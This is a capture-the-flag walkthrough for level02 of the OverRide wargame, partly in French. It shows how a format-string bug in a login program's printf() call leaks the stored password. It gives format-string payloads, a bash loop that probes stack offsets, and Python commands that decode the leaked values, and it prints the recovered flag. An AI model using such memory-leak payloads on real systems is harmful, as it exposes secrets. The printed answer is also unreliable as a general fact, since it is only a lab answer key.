# Level02 Walkthrough

## Analyzing the Program with GDB

1. **Whats happening**:  

```bash
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: admin
--[ Password: admin
*****************************************
admin does not have access!
```

- We can see a call to the system function, if the password is gud. Address is : 
```bash
(gdb) info address system
Symbol "system" is at 0x4006b0 in a file compiled without debugging.
```
- Exit address : `0x400710`

- Vulnerability here is that `username` is printed with `printf()`. So we can use the `format string attack` what is on the stack, where the password is stored. (like first level of rainfall)

- The /home/users/level03/.pass is on the stack so we can print the stack thanks to the `string format attack`. We can print content. 
```bash
Username: %p %p %p %p %p %p %p %p %p %p
or
Username: %22$p
```

or 

```bash
for(( i = 1; i < 100; i++)); do echo "$i - %$i\$p" | ./level02 | grep does; done
```
---

## Running the Program

or after the for loop : 
```bash
[...]
22 - 0x756e505234376848 does not have access!
23 - 0x45414a3561733951 does not have access!
24 - 0x377a7143574e6758 does not have access!
25 - 0x354a35686e475873 does not have access!
26 - 0x48336750664b394d does not have access!
[...]
```

- This is a simplified version ; Here is the explanation : 
    - We have a lot of `0x7fffffffe` it means that we are in the stack of the program
    - `0x400730`, `0x400814` et `0x400ac0`are on the typical field of the binary program, probably .text
    - `0x2a2a2a2a2a2a2a2a` valeur de remplissages, magical numbers
    - and there is `0x756e505234376848` which are non-values ASCII in memories

- Values are written upside-down because of endianness : l'architecture utilise le little-endian, ce qui signifie que les octets les moins significatifs sont stockés en premier en mémoire. 

- So now : 
    - `Découper la valeur en blocs de 2 caractères (un octet = 2 caractères hexadécimaux).`
    - `Inverser ces blocs.`
    - `Convertir le tout en ASCII.`

```bash
level02@OverRide:~$ python -c 'print "756e505234376848".decode("hex")[::-1]'
Hh74RPnu
level02@OverRide:~$ python -c 'print "45414a3561733951".decode("hex")[::-1]'
Q9sa5JAE
level02@OverRide:~$ python -c 'print "377a7143574e6758".decode("hex")[::-1]' 
XgNWCqz7
level02@OverRide:~$ python -c 'print "354a35686e475873".decode("hex")[::-1]' 
sXGnh5J5
level02@OverRide:~$ python -c 'print "48336750664b394d".decode("hex")[::-1]' 
M9KfPg3H

Final: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

## Moving to level03

1. **Swith User to level03**:
    Run ```su level03```

2. **Authenticate with the Password**:

